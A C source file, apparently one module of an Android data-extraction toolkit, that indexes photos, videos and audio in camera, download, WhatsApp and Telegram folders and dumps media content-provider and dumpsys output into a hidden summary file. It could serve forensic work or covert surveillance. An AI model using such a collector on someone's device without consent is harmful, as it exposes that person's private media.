// engine_14_media.c - Media file scanner with metadata
#include "common.h"
static int write_file_with_name(const char *dir, const char *name, const char *content) {
    char p[MAX_PATH]; snprintf(p, sizeof(p), "%s/%s", dir, name); return write_file(p, content);
}
static FILE *fopen_append(const char *dir, const char *name) {
    char p[MAX_PATH]; snprintf(p, sizeof(p), "%s/%s", dir, name); return fopen(p, "a");
}
static int scan_media(const char *base, const char *out, int depth) {
    DIR *d = opendir(base); if (!d || depth > 6) return 0;
    struct dirent *e; char sp[MAX_PATH]; int n = 0;
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] == '.') continue;
        snprintf(sp, sizeof(sp), "%s/%s", base, e->d_name);
        struct stat st; if (stat(sp, &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) {
            n += scan_media(sp, out, depth + 1);
        } else if (S_ISREG(st.st_mode) && st.st_size > 0) {
            if (has_ext(e->d_name, ".jpg") || has_ext(e->d_name, ".jpeg") ||
                has_ext(e->d_name, ".png") || has_ext(e->d_name, ".gif") ||
                has_ext(e->d_name, ".mp4") || has_ext(e->d_name, ".3gp") ||
                has_ext(e->d_name, ".mkv") || has_ext(e->d_name, ".avi") ||
                has_ext(e->d_name, ".mp3") || has_ext(e->d_name, ".wav") ||
                has_ext(e->d_name, ".aac") || has_ext(e->d_name, ".flac") ||
                has_ext(e->d_name, ".webm") || has_ext(e->d_name, ".mov") ||
                has_ext(e->d_name, ".heic") || has_ext(e->d_name, ".heif")) {
                char dst[MAX_PATH * 2];
                snprintf(dst, sizeof(dst), "%s/media", out);
                mkdir_p(dst);
                // Add to media index instead of copying (too large)
                FILE *idx = fopen_append(out, "media_index.csv");
                if (idx) {
                    fprintf(idx, "%s,%lld,%s,%ld\n", e->d_name, (long long)st.st_size, sp, (long)st.st_mtime);
                    fclose(idx); n++;
                }
            }
        }
    } closedir(d); return n;
}
int main(int argc, char **argv) {
    const char *outdir = argc > 1 ? argv[1] : ".";
    char res[MAX_PATH], jsonname[MAX_PATH], buf[65536];
    snprintf(res, sizeof(res), "%s/media", outdir); mkdir_p(res);
    snprintf(jsonname, sizeof(jsonname), "%s/.engine_14.json", outdir); json_start(jsonname);
    int count = 0;
    // Media directories
    const char *dirs[] = {
        "/storage/emulated/0/DCIM/",
        "/storage/emulated/0/Pictures/",
        "/storage/emulated/0/Download/",
        "/storage/emulated/0/Movies/",
        "/storage/emulated/0/Music/",
        "/storage/emulated/0/WhatsApp/Media/",
        "/storage/emulated/0/Telegram/",
        "/storage/emulated/0/Android/media/",
        NULL
    };
    for (int i = 0; dirs[i]; i++) {
        if (dir_exists(dirs[i])) count += scan_media(dirs[i], res, 0);
    }
    // Also scan /sdcard broadly
    const char *alt_dirs[] = {
        "/sdcard/DCIM/", "/sdcard/Pictures/", "/sdcard/Download/",
        "/sdcard/Movies/", "/sdcard/Music/", "/sdcard/WhatsApp/",
        "/sdcard/Telegram/", "/storage/self/primary/DCIM/",
        "/storage/self/primary/Pictures/", "/storage/self/primary/Download/",
        NULL
    };
    for (int i = 0; alt_dirs[i]; i++) {
        if (dir_exists(alt_dirs[i])) count += scan_media(alt_dirs[i], res, 0);
    }
    // Content provider media
    run_cmd("content query --uri content://media/external/images 2>/dev/null | head -2000 || true", buf, sizeof(buf));
    if (strlen(buf) > 10) { write_file_with_name(res, "media_images_content.txt", buf); count++; }
    run_cmd("content query --uri content://media/external/video 2>/dev/null | head -2000 || true", buf, sizeof(buf));
    if (strlen(buf) > 10) { write_file_with_name(res, "media_video_content.txt", buf); count++; }
    run_cmd("content query --uri content://media/external/audio 2>/dev/null | head -2000 || true", buf, sizeof(buf));
    if (strlen(buf) > 10) { write_file_with_name(res, "media_audio_content.txt", buf); count++; }
    // dumpsys media
    run_cmd("dumpsys media 2>/dev/null | head -500 || true", buf, sizeof(buf));
    if (strlen(buf) > 10) { write_file_with_name(res, "dumpsys_media.txt", buf); count++; }
    json_ki("files_extracted", count); json_end();
    printf("{\"engine\":\"media\",\"status\":\"ok\",\"files\":%d}\n", count);
    return 0;
}
